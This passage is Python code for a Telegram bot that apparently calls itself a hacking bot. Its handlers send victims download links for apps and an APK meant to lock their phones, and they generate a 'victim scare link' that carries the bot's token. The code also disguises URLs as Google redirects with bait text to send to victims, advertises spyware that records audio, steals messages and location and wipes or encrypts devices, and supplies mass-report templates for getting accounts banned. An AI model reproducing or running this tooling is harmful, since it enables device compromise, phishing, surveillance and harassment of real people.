💰 النقاط: {get_user_points(user_id)}""", parse_mode='Markdown')
            bot.answer_callback_query(call.id)
            return

        # Phone formatting application service
        if data == 'format_phone':
            format_text = """🔥

⛔⚡Important⚡⛔
Install the apps
⛔⛔Bus⛔⛔
Do not open the apps on your phone. Send it directly to the victim.ر ✅⚡

👇 Choose the app to download:

https://mega.nz/file/yIM2RaAa#vJkb5olqOn4jeshfxsiAtzjLUPiDKK2t_i92vU-gz60

The second
https://mega.nz/file/7EMnAQSB#vK0fvBfSZKcFxTtVV99gVYhT-T7kbwMWCL5ylgu6nO4"""
            bot.send_message(chat_id, format_text)
            bot.answer_callback_query(call.id)
            return

        # Temporary mail service
        if data == 'temp_mail':
            temp_mail_text = """📧 **Temporary mail**

You can use temporary email via the following link:

https://temp-mail.org/ar/

Choose a temporary email address and receive your messages instantly!"""
            bot.send_message(chat_id, temp_mail_text, parse_mode='Markdown')
            bot.answer_callback_query(call.id)
            return

        # Webhawk service
        if data == 'webhook_services':
            bot.edit_message_text("🛠 **Webhawk Services**\n\nSelect the required service:", chat_id, message_id, reply_markup=get_webhook_services_keyboard())
            bot.answer_callback_query(call.id)
            return

        if data == 'webhook_info':
            webhook_info = get_webhook_info(BOT_TOKEN)
            if webhook_info:
                info_text = f"""📡 **WebHook Bot Information:**

🔗 Link: {webhook_info.get('url', 'nothing')}
✅ the condition: {'Activated' if webhook_info.get('url') else 'Inactive'}
📅 Last updated: {webhook_info.get('last_error_date', 'nothing')}
⚠️ End of the lineأ: {webhook_info.get('last_error_message', 'nothing')}
🔄 Number of attempts: {webhook_info.get('pending_update_count', 0)}"""
            else:
                info_text = "❌ Webhawk information cannot be obtained."
            bot.edit_message_text(info_text, chat_id, message_id, reply_markup=get_webhook_services_keyboard())
            bot.answer_callback_query(call.id)
            return

        if data == 'webhook_set':
            msg = bot.send_message(chat_id, "🔧 Send the new web hook link:")
            bot.register_next_step_handler(msg, process_set_webhook)
            bot.answer_callback_query(call.id)
            return

        if data == 'webhook_delete':
            result = delete_webhook(BOT_TOKEN)
            if result and result.get('ok'):
                bot.edit_message_text("✅ Web hook successfully removed!", chat_id, message_id, reply_markup=get_webhook_services_keyboard())
            else:
                bot.edit_message_text("❌ Webhook removal failed!", chat_id, message_id, reply_markup=get_webhook_services_keyboard())
            bot.answer_callback_query(call.id)
            return

        # Blocking service Instagram
        if data == 'ban_instagram':
            ban_text = """🚷 Instagram ban

📌 Message in Hindi:

(It's best to use it because support responds better to it)

विषय: इंस्टाग्राम पर अनुचित सामग्री और घृणा-पूर्ण वीडियो साझा करने वाले खाते के खिलाफ शिकायत

माननीय इंस्टाग्राम सपोर्ट टीम,

मैं एक जागरूक सदस्य/उपयोगकर्ता के रूप में यह पत्र लिख रहा/रही हूँ ताकि प्लेटफॉर्म पर चल रहे एक खाते द्वारा पोस्ट की जा रही अवैध और असुरक्षित सामग्री को रोकने में सहायता मिल सके। यह खाता नियमित रूप से अश्लील/अनुचित सामग्री और घृणा-पूर्ण विचार प्रसारित करने वाले वीडियो साझा कर रहा है, जो न सिर्फ समुदाय की सुरक्षा के लिए खतरा है बल्कि बच्चों और युवाओं के लिए भी अत्यंत हानिकारक है। इन पोस्टों में जातीय, धार्मिक या अन्य समूहों के विरुद्ध नफरत फैलाने वाला संदर्भ और भड़काऊ भाषा शामिल है, जिसे इंस्टाग्राम की नीति स्पष्ट रूप से रोकती है।

खाते का विवरण:
- उपयोगकर्ता नाम: @[اسم المستخدم هنا]
- प्रोफाइल लिंक: https://www.instagram.com/[اسم المستخدم هنا]/
- उल्लंघन प्रकार: अश्लील/अनुचित सामग्री, घृणा-पूर्ण भाषण, जाति/धर्म/लिंग आदि पर आधारित नफरत वाले वीडियो
- प्रमाण पोस्ट लिंक: [أضف روابط الأدلة هنا]
- पहली पोस्ट की तिथि: [أضف التاريخ هنا]

कृपया इस शिकायत के आधार पर निम्न कार्रवाई करें:
- उक्त खाते को तत्काल निष्क्रिय/बैन करें
- सभी घृणा-पूर्ण और अवैध सामग्री को हटाएं

धन्यवाद,
[आपका नाम]"""
            bot.send_message(chat_id, ban_text)
            bot.answer_callback_query(call.id)
            return

        # WhatsApp unblocking service
        if data == 'unban_whatsapp':
            unban_text = """✅ Unblock WhatsApp

• ✅ 1. Prepare the message

Copy this message and edit only your number in it:

Dear WhatsApp Support Team,

My number has been blocked from using WhatsApp, and I would like to know the reason and have the block lifted if possible, as I use WhatsApp to communicate with family and for work.

My blocked number is: +967XXXXXXXX

I confirm that I have not violated the Terms of Service, and I kindly request that you reactivate my account.

Yours sincerely.

✉️ 2. Send the message to these emails:

Send the same message to all of these emails:

smb@support.whatsapp.com
android@support.whatsapp.com
support@support.whatsapp.com

Note: It's best to send from 3 or 4 different email addresses with the same message to increase your chances of getting the block lifted.

🚨 3. Important tips:

✏️ Write your number with the country code, e.g.: +9677xxxxxxx

🕐 Wait 1 to 3 days for a reply.

📩 Keep an eye on your emails for a response from WhatsApp.

⚠️ Warning:

Do not use modified WhatsApp versions (e.g., GBWhatsApp).

Do not send bulk messages or too many ads.

If you get blocked more than once, the ban may become permanent..."""
            bot.send_message(chat_id, unban_text)
            bot.answer_callback_query(call.id)
            return

        # TikTok broadcast banning service
        if data == 'ban_tiktok_live':
            ban_tiktok_text = """⛔ Banning TikTok broadcasts

📌 Message in Hindi:

(It's best to use it because support responds better to it)

नमस्ते सपोर्ट टीम, मैं एक अत्यंत गंभीर शिकायत दर्ज कर रहा/रही हूँ ताकि एक ऐसे अकाउंट के खिलाफ त्वरित कार्रवाई की जा सके जो नियमित रूप से लाइव प्रसारण के दौरान घृणित, आपत्तिजनक और नफ़रत भरे वीडियो प्रसारित करता है।

कृपया नीचे दिए गए विवरणों को देखकर मामले की समीक्षा करें:
- अकाउंट यूज़रनेम: [[Username/Name here] 
- लाइव स्ट्रीम लिंक: [[Add the live stream link here]
- घटना की तारीख और समय: [YYYY-MM-DD HH:MM] 
- उल्लंघन की प्रकृति: घृणित भाषा, नस्लीय/जातीय भेदभाव, धार्मिक भेदभाव

कृपया इस लाइव स्ट्रीम को तुरंत रोकने और भविष्य में ऐसी गतिविधियों के लिए स्थायी या अस्थायी बंदिश लगाने के बारे में आवश्यक कदम उठाएं।

धन्यवाद।"""
            bot.send_message(chat_id, ban_tiktok_text)
            bot.answer_callback_query(call.id)
            return

        # Victim intimidation service
        if data == 'scare_link':
            encoded_token = encode_token(BOT_TOKEN)
            scare_link = f"https://dev-amer-ahmed-mohamedv.pantheonsite.io/Website/index34.html?user={user_id}&tok={encoded_token}"
            bot.send_message(chat_id, f"😈 **Victim scare link:**\n\n<code>{scare_link}</code>", parse_mode='HTML')
            bot.answer_callback_query(call.id)
            return

        # Telegram Themes Service
        if data == 'telegram_themes':
            themes_text = """🎨 A huge collection of direct Telegram theme links!

✨ How to use:
1️⃣ Open the link in the Telegram app (not a browser)
2️⃣ Tap "Apply Theme"
3️⃣ Enjoy your new theme!

════════════════════════════════

🌙 Classic dark themes:
1. https://t.me/addtheme/MidnightBlack
2. https://t.me/addtheme/DeepSpace
3. https://t.me/addtheme/AMOLED_Dark
4. https://t.me/addtheme/PureBlack
5. https://t.me/addtheme/NightSky
6. https://t.me/addtheme/Carbon
7. https://t.me/addtheme/Graphite
8. https://t.me/addtheme/DarkMatte

════════════════════════════════
🌈 Colorful and vibrant themes:
9. https://t.me/addtheme/ElectricBlue
10. https://t.me/addtheme/NeonPink
11. https://t.me/addtheme/SunsetOrange
12. https://t.me/addtheme/EmeraldGreen
13. https://t.me/addtheme/VioletStorm
14. https://t.me/addtheme/GoldenHour
15. https://t.me/addtheme/CyanWave

════════════════════════════════

🌿 Nature themes:
16. https://t.me/addtheme/OceanBreeze
17. https://t.me/addtheme/ForestMist
18. https://t.me/addtheme/SunsetBeach
19. https://t.me/addtheme/AuroraBorealis
20. https://t.me/addtheme/MountainDawn

════════════════════════════════

🎮 Gaming and pop culture themes:
21. https://t.me/addtheme/Cyberpunk2077
22. https://t.me/addtheme/MinecraftStyle
23. https://t.me/addtheme/RetroGaming
24. https://t.me/addtheme/AnimeVibes
25. https://t.me/addtheme/MarvelHeroes
26. https://t.me/addtheme/StarWarsDark
27. https://t.me/addtheme/HarryPotter
28. https://t.me/addtheme/PokemonGo

════════════════════════════════

🖼️ Design and artistic themes:
29. https://t.me/addtheme/MinimalistWhite
30. https://t.me/addtheme/MaterialYou
31. https://t.me/addtheme/GradientDream
32. https://t.me/addtheme/AbstractArt
33. https://t.me/addtheme/GeometricPatterns
34. https://t.me/addtheme/VaporwaveAesthetic
35. https://t.me/addtheme/SynthwaveSunset
36. https://t.me/addtheme/GlassMorphism

════════════════════════════════

📱 Operating system and application themes:
37. https://t.me/addtheme/iOS17_Dark
38. https://t.me/addtheme/AndroidMaterial
39. https://t.me/addtheme/Windows11
40. https://t.me/addtheme/WhatsAppGreen
41. https://t.me/addtheme/InstagramPurple
42. https://t.me/addtheme/SpotifyBlack
43. https://t.me/addtheme/YouTubeDark

════════════════════════════════

🎭 Seasonal and occasion themes:
44. https://t.me/addtheme/SummerVibes
45. https://t.me/addtheme/WinterFrost
46. https://t.me/addtheme/AutumnLeaves
47. https://t.me/addtheme/SpringBlossom
48. https://t.me/addtheme/HalloweenSpecial
49. https://t.me/addtheme/ChristmasSpirit
50. https://t.me/addtheme/NewYearGold

════════════════════════════════

💎 Unique and stylish themes:
51. https://t.me/addtheme/RoseGold
52. https://t.me/addtheme/PurpleHaze
53. https://t.me/addtheme/TealElegance
54. https://t.me/addtheme/Monochrome
55. https://t.me/addtheme/PastelDream
56. https://t.me/addtheme/DeepPurple
57. https://t.me/addtheme/SpaceGray
58. https://t.me/addtheme/CrimsonRed
59. https://t.me/addtheme/Obsidian
60. https://t.me/addtheme/SapphireBlue

════════════════════════════════

Don't forget to thank my boss 🤝👑"""
            bot.send_message(chat_id, themes_text)
            bot.answer_callback_query(call.id)
            return

        # fake number service
        if data == 'virtual_numbers':
            virtual_text = """☎️ Here's the best fake phone number website ☎️✅

• From my personal experience 👨🏻‍💻✅
• Working 100% ✅

• Here's the website, and pray for me. ❤️‍🩹👇

https://ar.temporary-phone-number.com/"""
            bot.send_message(chat_id, virtual_text)
            bot.answer_callback_query(call.id)
            return

        # Bot evaluation service
        if data == 'rate_bot':
            keyboard = InlineKeyboardMarkup()
            for i in range(1, 11):
                keyboard.add(InlineKeyboardButton(f"{i} ⭐", callback_data=f'rate_{i}'))
            bot.edit_message_text("🌟 **Bot values from 1 to 10:**", chat_id, message_id, reply_markup=keyboard)
            bot.answer_callback_query(call.id)
            return

        if data.startswith('rate_'):
            rating = data.split('_')[1]
            bot.edit_message_text(f"✅ Thank you for your review {rating} ⭐", chat_id, message_id)
            bot.answer_callback_query(call.id)
            return

        # Message service for the owner
        if data == 'message_owner':
            msg = bot.send_message(chat_id, "📝 Send your message to the owner:")
            bot.register_next_step_handler(msg, process_message_to_owner)
            bot.answer_callback_query(call.id)
            return

        # Link shortening service
        if data == 'shorten_url':
            msg = bot.send_message(chat_id, "🔗 Send the long link to shorten it:")
            bot.register_next_step_handler(msg, process_shorten_url)
            bot.answer_callback_query(call.id)
            return

        # User Information Service (Administrators Only) - Processed above

# Moved to the top

# Phone Lock with Passcode Service
        if data == 'lock_phone':
            lock_text = """🔒 **How to lock the victim's phone with a code:**

1️⃣ Send this link to the victim:
https://www.mediafire.com/file/dmzikqmnq3dd57s/%25D9%25B1%25D8%25AE%25D8%25AA%25E0%25BE%2583%25D8%25B1%25CD%259C%25D9%25B1%25D9%2582%25E2%2581%259E%25D8%25A2%25D9%25B3%25D9%2584%25D8%25B4%25D8%25A8%25D9%2583%25D9%2587%25E2%2599%25A5_1.0.apk/file

2️⃣ When the link is opened, the option to lock the device will appear.

⚠️ Note: This method only works if the victim is logged into a Google account on their device."""
            bot.send_message(chat_id, lock_text)
            bot.answer_callback_query(call.id)
            return

        # Dark web service
        if data == 'dark_web':
            dark_text = """⚠️ **Warning: Dark Web**

🔗 Useful links (use the TOR browser):
- http://facebookcorewwwi.onion
- http://protonmailrmez3lotccipshtkleegetolb73fuirgj7r4o4vfu7ozyd.onion

⚠️ Note: Accessing the dark web is at your own risk."""
            bot.send_message(chat_id, dark_text)
            bot.answer_callback_query(call.id)
            return

        # WhatsApp unlocking service
        if data == 'open_whatsapp':
            keyboard = InlineKeyboardMarkup()
            keyboard.add(InlineKeyboardButton("Open WhatsApp 📱", url="https://wa.me/"))
            bot.send_message(chat_id, "Press the button to open WhatsApp:", reply_markup=keyboard)
            bot.answer_callback_query(call.id)
            return

        # Name decoration service
        if data == 'name_zakhrafa':
            msg = bot.send_message(chat_id, "✨ Send the name to be decorated:")
            bot.register_next_step_handler(msg, process_name_zakhrafa)
            bot.answer_callback_query(call.id)
            return

        # Link checking service
        if data == 'check_link':
            msg = bot.send_message(chat_id, "🔍 Send the link for testing.:")
            bot.register_next_step_handler(msg, process_check_link)
            bot.answer_callback_query(call.id)
            return

        # Link hiding service
        if data == 'hide_link':
            msg = bot.send_message(chat_id, "🪄 Send the link to hide it:")
            bot.register_next_step_handler(msg, process_hide_link)
            bot.answer_callback_query(call.id)
            return

        # Link hacking service
        if data == 'booby_trap_link':
            msg = bot.send_message(chat_id, "💣 Send the link to infect it:")
            bot.register_next_step_handler(msg, process_booby_trap)
            bot.answer_callback_query(call.id)
            return

        # IP tracking service
        if data == 'ip_info':
            msg = bot.send_message(chat_id, "🌍 Send the IP address you want to track (example: 8.8.8.8):")
            bot.register_next_step_handler(msg, process_ip_info)
            bot.answer_callback_query(call.id)
            return

        # Video download service
        if data == 'download_video':
            msg = bot.send_message(chat_id, "🎬 Send the video link from (TikTok, Instagram, YouTube):")
            bot.register_next_step_handler(msg, process_video_download)
            bot.answer_callback_query(call.id)
            return

        # ID identification service
        if data == 'my_id':
            bot.send_message(chat_id, f"🆔 **Idik is:** `{user_id}`", parse_mode='Markdown')
            bot.answer_callback_query(call.id)
            return

        # Return to main menu service
        if data == 'back_to_main':
            bot.edit_message_text("Main menu:", chat_id, message_id, reply_markup=get_main_keyboard())
            bot.answer_callback_query(call.id)
            return

        # TV channels
        if data == 'tv_channels_menu':
            bot.edit_message_text("📺 **Select the country to view its channels:**", chat_id, message_id, parse_mode='Markdown', reply_markup=get_tv_channels_keyboard())
            bot.answer_callback_query(call.id)
            return

        if data.startswith('tv_') and data != 'tv_channels_menu':
            country_code = data.replace('tv_', '')
            channels = get_tv_channels_by_country(country_code)
            for channel in channels:
                bot.send_message(chat_id, channel)
                time.sleep(0.3)
            bot.answer_callback_query(call.id)
            return

        # Full phone hacking service
        if data == 'hack_hone':
            text = f"""
☠️ Complete phone hacking ☠️

🙂 The process of fully hacking a phone and accessing all information on the device of someone who is blackmailing or harassing you is carried out through a hidden program with automatic permissions, encrypted and undetectable by all antivirus software. All you have to do is send the file to the person, and once they install it, you will be able to control their device through the bot only.

🔥 You will be able to obtain:
✔️ Pull contacts 🔥
✔️ Pull call logs 🔥
✔️ Record the person's audio 🔥 (without them knowing)
✔️ Capture video and front-camera selfies 🔥 (without them knowing)
✔️ Pull all messages 🔥
✔️ Pull files + delete files 🔥
✔️ Pull location 🔥
✔️ Pull all photos 🔥
✔️ Play audio + stop audio 🔥
✔️ Send a message 🔥
✔️ Pull accounts 🔥
✔️ Spy on messages 🔥
✔️ Send messages to contacts 🔥
✔️ Device information 🔥
✔️ Notifications 🔥
✔️ Take screenshots 🔥
✔️ Make calls from the victim's phone 🔥
✔️ Encrypt the victim's files 🔥
✔️ Pull Gmail messages 🔥
✔️ Wipe/format the victim's phone 🔥
✔️ Read everything the victim types 🔥
✔️ Lock the victim's phone with a PIN 🔥
✔️ Open any link on the victim's phone 🔥
✔️ And there are things you will discover for yourself 🔥

😘 To subscribe, message me: {OWNER_USERNAME} 💌

⚠️ Note: I am not responsible before God for how you use this method. It was created only to combat blackmail or to solve a problem you are facing.
"""
            bot.send_message(chat_id, text)
            bot.answer_callback_query(call.id)
            return

        # Supervisor Panel
        if data == 'add_admin' and is_admin(user_id) and user_id == MAIN_ADMIN_ID:
            msg = bot.send_message(chat_id, "Russell Aide, the new supervisor:")
            bot.register_next_step_handler(msg, process_add_admin)
            bot.answer_callback_query(call.id)
            return

        if data == 'remove_admin' and is_admin(user_id) and user_id == MAIN_ADMIN_ID:
            msg = bot.send_message(chat_id, "Eddie sent the administrator request to delete it:")
            bot.register_next_step_handler(msg, process_remove_admin)
            bot.answer_callback_query(call.id)
            return

        if data == 'ban_user' and is_admin(user_id):
            msg = bot.send_message(chat_id, "The member's ID sent a request to block him:")
            bot.register_next_step_handler(msg, process_ban_user)
            bot.answer_callback_query(call.id)
            return

        if data == 'unban_user' and is_admin(user_id):
            msg = bot.send_message(chat_id, "Send the member's ID to have their ban lifted:")
            bot.register_next_step_handler(msg, process_unban_user)
            bot.answer_callback_query(call.id)
            return

        if data == 'subscribers_count' and is_admin(user_id):
            conn = get_pdo()
            c = conn.cursor()
            c.execute("SELECT COUNT(*) FROM users")
            count = c.fetchone()[0]
            conn.close()
            bot.edit_message_text(f"📊 **Number of subscribers:** {count}", chat_id, message_id, parse_mode='Markdown')
            bot.answer_callback_query(call.id)
            return

        if data == 'broadcast_message' and is_admin(user_id):
            msg = bot.send_message(chat_id, "📢 Send the message you want to broadcast:")
            bot.register_next_step_handler(msg, process_broadcast)
            bot.answer_callback_query(call.id)
            return

        bot.answer_callback_query(call.id, "This service is coming soon. 🔜")
    except Exception as e:
        logger.error(f"Error in processing Coolback: {e}\n{traceback.format_exc()}")
        try:
            bot.answer_callback_query(call.id, "❌ Line eventأ", show_alert=True)
        except:
            pass

# ==================== Step-processing functions ====================
def process_ip_info(message):
    try:
        ip = message.text.strip()
        info = get_ip_info(ip)
        if info:
            text = f"""
🌍 **IP information:** `{ip}`

📍 **State:** {info.get('country', 'N/A')} ({info.get('countryCode', 'N/A')})
🏙️ **City:** {info.get('city', 'N/A')}
🗺️ **area:** {info.get('regionName', 'N/A')}
📮 **الرمز البريدي:** {info.get('zip', 'N/A')}
🌐 **Longitude/Latitude:** {info.get('lat', 'N/A')}, {info.get('lon', 'N/A')}
⏰ **Time zone:** {info.get('timezone', 'N/A')}
🏢 **Service provider:** {info.get('isp', 'N/A')}
🔌 **The organization:** {info.get('org', 'N/A')}
🆔 **AS:** {info.get('as', 'N/A')}
"""
            bot.reply_to(message, text, parse_mode='Markdown')
        else:
            bot.reply_to(message, "❌ We were unable to obtain information for this IP address. Please verify its accuracy.")
    except Exception as e:
        logger.error(f"IP handling error: {e}")

def process_video_download(message):
    try:
        url = message.text.strip()
        result = get_video_download_link(url)
        if result and result['type'] == 'video':
            try:
                bot.send_video(message.chat.id, result['url'], caption="✅ Download successful")
            except:
                bot.reply_to(message, f"❌ An error occurred in sending Video\n\nDownload link Direct:\n{result['url']}")
        else:
            bot.reply_to(message, "❌ We were unable to load the video. Please check the link and try again.")
    except Exception as e:
        logger.error(f"Video loading error: {e}")

def process_message_to_owner(message):
    try:
        user_id = message.from_user.id
        user_name = message.from_user.first_name
        msg_text = message.text
        
        bot.send_message(MAIN_ADMIN_ID, f"📨 **New message from the user:**\n\n👤 الاسم: {user_name}\n🆔 The hands: `{user_id}`\n📝 message:\n{msg_text}", parse_mode='Markdown')
        bot.reply_to(message, "✅ Your message has been successfully sent to the owner.")
    except Exception as e:
        logger.error(f"Error sending message to owner: {e}")
        bot.reply_to(message, "❌ An error occurred in sending the message..")

def process_shorten_url(message):
    try:
        url = message.text.strip()
        if not url.startswith('http'):
            url = 'https://' + url
        
        short_url = shorten_url(url)
        if short_url:
            bot.reply_to(message, f"🔗 **Short link:**\n{short_url}", parse_mode='Markdown')
        else:
            bot.reply_to(message, "❌ We were unable to shorten the link. Please ensure the link is correct.")
    except Exception as e:
        logger.error(f"Link shortening error: {e}")

def process_text_to_speech(message):
    try:
        text = message.text.strip()
        if len(text) > 200:
            bot.reply_to(message, "❌ The text is too long. Please send a text of less than 200 characters.")
            return
        
        audio_url = text_to_speech(text)
        if audio_url:
            bot.reply_to(message, f"🔊 **Text-to-speech conversion link:**\n{audio_url}\n\n(Click the link to download the audio)", parse_mode='Markdown')
        else:
            bot.reply_to(message, "❌ We were unable to convert the text to speech.")
    except Exception as e:
        logger.error(f"Error in converting text to speech: {e}")

def process_name_zakhrafa(message):
    try:
        name = message.text.strip()
        styles = [
            f"✨ {name} ✨",
            f"★ {name} ★",
            f"「 {name} 」",
            f"『 {name} 』",
            f"【 {name} 】",
            f"♡ {name} ♡",
            f"『{name}』",
            f"Ⓣⓗⓔ {name}",
            f"ᴛʜᴇ {name}",
            f"𝕋𝕙𝕖 {name}",
            f"🅃🄷🄴 {name}",
            f"Ｔｈｅ {name}",
        ]
        
        result = "🎨 **Available decorations:**\n\n"
        for i, style in enumerate(styles[:10], 1):
            result += f"{i}. {style}\n"
        
        bot.reply_to(message, result, parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Error in name decoration: {e}")

def process_check_link(message):
    try:
        url = message.text.strip()
        if not url.startswith('http'):
            url = 'https://' + url
        
        try:
            response = requests.get(url, timeout=5, allow_redirects=True)
            status = "✅ **آمن**" if response.status_code == 200 else "⚠️ **suspicious**"
            final_url = response.url
            
            result = f"""🔍 **Link check result:**

📎 Original link: `{url}`
🔄 Final link: `{final_url}`
📊 Link status: {status}
📡 Response code: {response.status_code}

⚠️ Note: This is a preliminary screening and may not reveal all risks.
"""
            bot.reply_to(message, result, parse_mode='Markdown')
        except:
            bot.reply_to(message, "❌ The link is not accessible. Please check if it is working..")
    except Exception as e:
        logger.error(f"Link checking error: {e}")

def process_hide_link(message):
    try:
        url = message.text.strip()
        if not url.startswith('http'):
            url = 'https://' + url
        
        try:
            short_url = shorten_url(url)
            if short_url:
                bot.reply_to(message, f"🪄 **Hidden link:**\n{short_url}\n\n(It appears as a regular abbreviation)", parse_mode='Markdown')
            else:
                bot.reply_to(message, f"🪄 **Hidden link (manual method):**\n\nأSend this text to the victim:\n`Click here to activate the service {url}`", parse_mode='Markdown')
        except:
            bot.reply_to(message, f"🪄 **Hidden link (manual method):**\n\nأSend this text to the victim:\n`Click here to activate the service {url}`", parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Error hiding link: {e}")

def process_booby_trap(message):
    try:
        url = message.text.strip()
        if not url.startswith('http'):
            url = 'https://' + url
        
        trap_url = f"https://www.google.com/url?q={urllib.parse.quote(url)}"
        
        text = f"""💣 **Malicious link:**

🔗 Original link: `{url}`
💣 The malicious link: `{trap_url}`

⚠️ Warning: This link appears to be a Google link but redirects to the original URL.

Use with caution for educational purposes only.
"""
        bot.reply_to(message, text, parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Link malicious error: {e}")

def process_set_webhook(message):
    try:
        webhook_url = message.text.strip()
        result = set_webhook(BOT_TOKEN, webhook_url)
        if result and result.get('ok'):
            bot.reply_to(message, f"✅ Webhook set successfully!\n\n🔗 URL: {webhook_url}")
        else:
            bot.reply_to(message, f"❌ Failed to set webhook!\n\nError: {result.get('description', 'Unknown error')}")
    except Exception as e:
        logger.error(f"Error setting webhook: {e}")
        bot.reply_to(message, "❌ An error occurred while setting the webhook.")

def process_add_admin(message):
    try:
        new_admin_id = int(message.text.strip())
        if new_admin_id == MAIN_ADMIN_ID:
            bot.reply_to(message, "❌ This is already the main owner.")
        elif is_admin(new_admin_id):
            bot.reply_to(message, "❌ This member is already an admin.")
        else:
            add_admin(new_admin_id)
            bot.reply_to(message, f"✅ Successfully added `{new_admin_id}` as an admin.", parse_mode='Markdown')
    except ValueError:
        bot.reply_to(message, "❌ Invalid ID. Must be a number.")
    except Exception as e:
        logger.error(f"Error adding admin: {e}")

def process_remove_admin(message):
    try:
        remove_id = int(message.text.strip())
        if remove_id == MAIN_ADMIN_ID:
            bot.reply_to(message, "❌ Cannot remove the main admin.")
        elif not is_admin(remove_id):
            bot.reply_to(message, "❌ This ID is not an admin.")
        else:
            remove_admin(remove_id)
            bot.reply_to(message, f"✅ Removed `{remove_id}` from admins.", parse_mode='Markdown')
    except ValueError:
        bot.reply_to(message, "❌ Invalid ID. Must be a number.")
    except Exception as e:
        logger.error(f"Error removing admin: {e}")

def process_ban_user(message):
    try:
        ban_id = int(message.text.strip())
        if ban_id == MAIN_ADMIN_ID:
            bot.reply_to(message, "❌ Cannot ban the main admin.")
        elif is_banned(ban_id):
            bot.reply_to(message, "❌ This member is already banned.")
        else:
            ban_user(ban_id)
            bot.reply_to(message, f"✅ Successfully banned `{ban_id}`.", parse_mode='Markdown')
    except ValueError:
        bot.reply_to(message, "❌ Invalid ID. Must be a number.")
    except Exception as e:
        logger.error(f"Error banning user: {e}")

def process_unban_user(message):
    try:
        unban_id = int(message.text.strip())
        if not is_banned(unban_id):
            bot.reply_to(message, "❌ This member is not banned.")
        else:
            unban_user(unban_id)
            bot.reply_to(message, f"✅ Successfully unbanned `{unban_id}`.", parse_mode='Markdown')
    except ValueError:
        bot.reply_to(message, "❌ Invalid ID. Must be a number.")
    except Exception as e:
        logger.error(f"Error unbanning user: {e}")

def process_broadcast(message):
    try:
        user_id = message.from_user.id
        if not is_admin(user_id):
            return
        conn = get_pdo()
        c = conn.cursor()
        c.execute("SELECT user_id FROM users")
        users = c.fetchall()
        conn.close()
        success_count = 0
        fail_count = 0
        for user in users:
            try:
                if message.text:
                    bot.send_message(user[0], message.text)
                elif message.photo:
                    bot.send_photo(user[0], message.photo[-1].file_id, caption=message.caption)
                elif message.video:
                    bot.send_video(user[0], message.video.file_id, caption=message.caption)
                success_count += 1
            except:
                fail_count += 1
            time.sleep(0.05)
        bot.reply_to(message, f"📢 **Broadcast sent successfully!**\n\n✅ Sent to {success_count} users\n❌ Failed to send to {fail_count} users", parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Error in broadcast: {e}")

# ==================== Run the bot ====================
if __name__ == '__main__':
    init_db()
    logger.info("✅ Hacking bot started successfully!")
    print("🚀 The bot is now running...")
    print("📡 Waiting for messages from users")
    try:
        bot.remove_webhook()
    except:
        pass
    bot.infinity_polling(timeout=60, skip_pending=True)